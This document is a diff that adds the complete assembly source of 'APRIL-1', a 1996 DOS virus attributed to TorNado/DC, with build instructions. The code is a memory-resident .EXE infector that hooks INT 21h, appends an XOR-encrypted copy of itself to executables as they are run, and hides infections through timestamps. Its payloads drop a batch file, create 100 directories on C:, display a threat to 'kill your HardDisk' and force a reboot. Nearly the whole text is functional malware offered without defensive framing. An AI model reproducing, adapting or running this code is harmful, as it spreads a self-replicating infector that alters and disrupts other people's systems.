@@ -1,0 +1,369 @@
+;*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
+;
+;                           A*P*R*I*L - 1
+;                                by
+;                         T o r N a d o / DC
+;                               
+;   Description:
+;   ------------
+;   -- Parasitic resident .EXE infector 
+;   -- Infects on 4bh (execute) 
+;   -- xor - encryption
+;   -- dont infect win .exe
+;   -- Saves original time / date
+;
+;   payload - 1: ( every time )
+;       - 36h = get disk space ( DIR ), drop batch file ( april1st.bat )
+;
+;   payload - 2: when user change drive to A:\ and time is ( >= 55 min )
+;       - draw green frame 
+;       - makes 100 directory's in C:\
+;       - Write message to user
+;       - Reboot
+;
+;   To compile:
+;   -----------
+;   Tasm april-1.asm
+;   Tlink april-1.obj
+;   Exe2bin april-1.exe april-1.com
+;
+;*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#**#*#*#*#*#*#*#*#*#*#*#*#*#*#**#*#*#*#*#**#*#*#*
+
+april_1         segment
+assume  cs:april_1,ds:april_1,es:april_1
+org     00h
+
+start:          call    delta
+
+delta:          pop     bp
+sub     bp,offset delta
+
+push    ds                  
+push    es
+push    cs
+pop     ds                  
+
+call    xor_crypt 
+jmp     short installation
+
+;============================= Payload - 1 ===================================
+april_1_batch   proc    near  
+
+push    es bp ax bx cx si di ds dx
+
+lea     dx,filename ; this creates our little signature!
+push    ds                      
+push    cs
+pop     ds
+mov     ah,3ch
+mov     cx,1        ; read-only!
+int     21h
+jc      no_drop
+
+xchg    ax,bx
+mov     ah,40h
+mov     cx,(drop_end - drop_start)
+lea     dx,[bp + offset drop_start]
+int     21h
+
+mov     ah,3eh  ; close drop file
+int     21h
+
+no_drop:        pop     ds
+jmp     exit_virus
+endp
+
+installation:   mov     ax,7474h
+int     21h
+
+cmp     bx,'AF'                     ; AF returned in bx?
+je      error_resident              ; = assume resident
+
+cut_memory:     mov     ah,4ah                      ; find top of memory
+mov     bx,0ffffh                   ; (65536)
+int     21h                          
+
+sub     bx,(codeend-start+15)/16+1  ; resize enough para's
+mov     ah,4ah                      ; for virus
+int     21h
+
+mov     ah,48h                      ; allocate for virus
+mov     bx,(codeend-start+15)/16
+int     21h
+jc      error_resident
+
+dec     ax                          ; ax - 1 = mcb
+mov     es,ax
+mov     byte ptr es:[0],'Z'
+mov     word ptr es:[1],8           ; dos = mcb owner
+inc     ax
+
+push    cs
+pop     ds
+
+mov     es,ax
+xor     di,di
+mov     cx,(codeend-start+4)/2      ; vir len
+mov     si,bp
+rep     movsw
+
+hook_int21h:    xor     ax,ax
+mov     ds,ax
+push    ds                            
+ 
+lds     ax,ds:[21h*4]                                            
+mov     word ptr es:[oldint21h],ax  
+mov     word ptr es:[oldint21h+2],ds
+pop     ds
+mov     word ptr ds:[21h*4],offset virusint21
+mov     ds:[21h*4+2],es
+
+error_resident: pop     es
+pop     ds 
+
+restore_EXE:    mov     ax,es
+add     ax,10h
+add     word ptr cs:[bp+csip+02h],ax
+cli
+mov     sp,word ptr cs:[bp+spss]
+add     ax,word ptr cs:[bp+spss+02h]
+mov     ss,ax
+sti
+db      0eah
+csip            dd      0fff00000h
+spss            dd      ?
+
+virusint21      proc    near
+
+cmp     ah,4bh            ; Execute!
+je      infect_file
+
+cmp     ah,0eh            ; Change drive!
+je      april_dir
+
+cmp     ah,36h            ; Get disk space!
+je      april_batch
+
+cmp     ax,7474h          ; Check if resident
+jne     function21
+mov     bx,'AF'           ; April Fool :)
+endp
+
+function21:     jmp     dword ptr cs:[oldint21h]
+ret
+
+april_batch:    jmp     april_1_batch
+
+april_dir:      jmp     april_dir_msg
+
+jump_out:       jmp     close
+
+infect_file     proc    near
+
+push    es bp ax bx cx si di ds dx
+
+mov     ax,3d02h                ;open file
+int     21h
+xchg    ax,bx
+
+push    cs
+push    cs
+pop     ds
+pop     es
+
+mov     ax,5700h           ;save and check time/date stamp
+int     21h
+push    dx
+push    cx
+and     cl,1fh
+xor     cl,1dh           ; secs = 29 !!!
+jne     read_bytes
+jmp     close
+
+read_bytes:     mov     ah,3fh            ;read 26 bytes to header
+mov     cx,1ah
+mov     dx,offset header 
+int     21h
+
+cmp     byte ptr header[24],'@' ; windows .EXE file ?
+je      jump_out
+
+cmp     byte ptr header,'M'     ; normal .EXE file ?
+je      exe_file
+
+jmp     close                   ; if not jump out
+
+exe_file:       mov     ax,4202h           ;goto end of file
+call    file_pointer
+
+push    ax                  
+push    es
+pop     es
+
+mov     di,offset csip       
+mov     si,offset header+14h
+mov     cx,2
+rep     movsw
+mov     si,offset header
+mov     cx,2
+rep     movsw
+
+pop     ax                          ; restore ax and
+mov     cx,10h
+div     cx
+sub     ax,word ptr [header+8h]
+mov     word ptr [header+14h],dx    ; calculate CS:IP
+mov     word ptr [header+16h],ax
+add     ax,00h 
+mov     word ptr [header+0eh],ax    ; SS:SP
+mov     word ptr [header+10h],00h
+
+write_virus:    mov     ah,2ch         ;get random number from time
+int     21h
+mov     word ptr ds:[encrypt_val],dx  
+mov     ax,08d00h
+mov     es,ax
+mov     di,00h
+mov     si,di
+mov     cx,(codeend-start+1)/2
+rep     movsw
+push    es
+pop     ds
+xor     bp,bp
+
+call    xor_crypt                   
+
+mov     ah,40h                 ; write it to file
+mov     cx,(codeend-start)
+mov     dx,offset start
+int     21h
+
+push    cs
+pop     ds
+
+mov     ax,4202h               ; go to end of file
+call    file_pointer
+
+mov     cx,512 ;recalculate new file length in 512-byte pages
+div     cx                 
+inc     ax
+mov     word ptr [header+2],dx
+mov     word ptr [header+4],ax
+
+mov     ax,4200h       ;go to beginning of file
+call    file_pointer
+
+mov     cx,1ah         ;write 26 bytes to file
+mov     dx,offset header
+mov     ah,40h
+int     21h
+
+close:          mov     ax,5701h       ;restore time/date and mark infected
+pop     cx
+pop     dx
+or      cl,00011101b
+and     cl,11111101b  ; secs = 29
+int     21h
+
+mov     ah,3eh
+int     21h     
+
+exit_virus:     pop     dx ds di si cx bx ax bp es
+jmp     function21
+endp
+
+file_pointer:   xor     cx,cx
+cwd
+int     21h
+ret
+
+;============================= Payload - 2 ===================================
+april_dir_msg   proc    near
+
+push    es bp ax bx cx si di ds dx
+
+cmp     dl,0            ; check which drive ??
+je      floppy_time
+jmp     exit_virus
+
+floppy_time:    mov     ah,2ch          ; get time ?
+int     21h
+
+cmp     cl,55           ; minute >= 55 ?
+jge     continue
+jmp     exit_virus
+
+continue:       mov     ax,3h           ; clear screen
+int     10h             
+
+mov     ah,0bh          ; draw green frame!
+mov     bx,0eh       
+int     10h          
+
+mov     ah,2h           ; set cursor position           
+mov     dh,10            
+mov     dl,14           
+int     10h             
+
+mov     ah,1h           ; get rid of cursor
+mov     cursor,cx       
+mov     cx,2000h        
+int     10h             
+
+mov     ah,9h           ; text string to write   
+push    cs
+pop     ds
+lea     dx,screen_msg
+int     21h
+
+mov     cx,64h     ; make 100 DIR's
+create_dir:     push    cx   
+
+mov     ah,39h              ; make SUB directory
+lea     dx,directoryname    
+int     21h
+       
+lea     si,directoryname+5h ; si = offset of last sign!
+inc     byte ptr [si]       
+
+pop     cx                  
+loop    create_dir
+   
+db      0eah,0f0h,0ffh,0ffh,0ffh  ; Reboot!        
+endp
+
+drop_start:
+ db      '@echo April Fool - 1996 - if u run this ' 
+ db      'batch file your HDD will burn!',00h 
+drop_end:
+
+filename        db      'april1st.bat',0
+
+directoryname   db      'C:\9<IJKHLN',00h
+
+screen_msg:     db      'April 1st.......i will now kill your HardDisk$' 
+
+encrypt_end:
+
+oldint21h       dd      ?
+encrypt_val     dw      0
+cursor          dw      ?
+header          db      1ah dup(?)      ; store 26 bytes from file
+
+logo            db "[ APRIL-1 (c) made by TorNado/[DC] in Denmark '96 ]"
+
+xor_crypt:      mov     dx,word ptr ds:[bp+encrypt_val]
+lea     si,[bp+april_1_batch]
+mov     cx,(encrypt_end-april_1_batch)/2
+
+xor_loop:       xor     word ptr ds:[si],dx         ;simple ordinary xor-loop
+inc     si                          ;encryption
+inc     si
+loop    xor_loop
+ret           
+codeend:
+
+april_1         ends
+end             start
+
+
